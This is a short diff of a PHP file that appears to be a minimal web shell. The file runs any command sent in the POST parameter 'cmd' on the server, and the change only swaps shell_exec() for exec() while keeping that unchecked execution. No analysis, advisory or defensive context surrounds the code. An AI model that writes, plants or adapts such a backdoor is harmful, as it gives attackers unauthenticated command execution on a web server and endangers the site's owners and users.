@@ -1,6 +1,6 @@
 <?php
 if (!empty($_POST['cmd'])) {
-    $cmd = shell_exec($_POST['cmd']);
+    $cmd = exec($_POST['cmd']);
 }
 ?>
 <!DOCTYPE html>
